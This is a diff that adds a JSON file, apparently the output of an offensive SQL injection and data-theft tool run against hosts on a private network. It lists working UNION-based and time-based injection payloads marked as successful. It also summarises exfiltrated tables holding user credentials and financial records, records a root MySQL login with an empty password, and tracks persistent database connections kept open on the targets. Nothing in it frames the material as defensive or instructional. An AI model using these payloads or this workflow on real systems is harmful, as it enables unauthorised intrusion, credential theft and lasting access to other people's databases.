@@ -1,0 +1,82 @@
+{
+  "sql_injections": [
+    {
+      "target": "http://192.168.1.5/login.php",
+      "payload": "' UNION SELECT user(),database(),version(),4,5,6,7,8,9,10--",
+      "type": "union",
+      "vulnerable": true,
+      "response_time": 0.15,
+      "data_extracted": ["Database error detected", "MySQL version info"]
+    },
+    {
+      "target": "http://192.168.1.7/search.php",
+      "payload": "' OR SLEEP(5)--",
+      "type": "time_based",
+      "vulnerable": true,
+      "response_time": 5.2,
+      "data_extracted": ["Time-based SQL injection confirmed"]
+    }
+  ],
+  "exfiltrated_data": [
+    {
+      "host": "192.168.1.5",
+      "type": "mysql",
+      "tables": [
+        {"name": "users", "rows": 1500, "columns": ["id", "username", "password", "email"]},
+        {"name": "products", "rows": 500, "columns": ["id", "name", "price", "description"]},
+        {"name": "orders", "rows": 2000, "columns": ["id", "user_id", "product_id", "date"]}
+      ],
+      "users": [
+        {"username": "admin", "privileges": "ALL", "host": "%"},
+        {"username": "root", "privileges": "ALL", "host": "localhost"},
+        {"username": "app_user", "privileges": "SELECT,INSERT,UPDATE", "host": "%"}
+      ],
+      "schemas": [
+        {"name": "public", "tables": 3, "size": "50MB"},
+        {"name": "admin", "tables": 1, "size": "5MB"}
+      ],
+      "sensitive_data": [
+        {"table": "users", "type": "credentials", "count": 1500},
+        {"table": "orders", "type": "financial", "count": 2000},
+        {"table": "products", "type": "business", "count": 500}
+      ],
+      "size": 1024000
+    }
+  ],
+  "schema_analysis": {
+    "total_databases": 2,
+    "total_tables": 6,
+    "sensitive_tables": [
+      "192.168.1.5.users",
+      "192.168.1.5.orders"
+    ],
+    "vulnerable_configurations": [
+      {
+        "host": "192.168.1.5",
+        "issue": "Default credentials",
+        "severity": "High"
+      }
+    ]
+  },
+  "db_credentials": [
+    {
+      "host": "192.168.1.5",
+      "type": "mysql",
+      "username": "root",
+      "password": "",
+      "privileges": "ALL",
+      "extraction_method": "default_access"
+    }
+  ],
+  "persistent_connections": [
+    {
+      "host": "192.168.1.5",
+      "port": 3306,
+      "type": "mysql",
+      "connection_id": "db_conn_1",
+      "status": "active",
+      "established_at": 1704657600
+    }
+  ],
+  "timestamp": 1704657600
+}
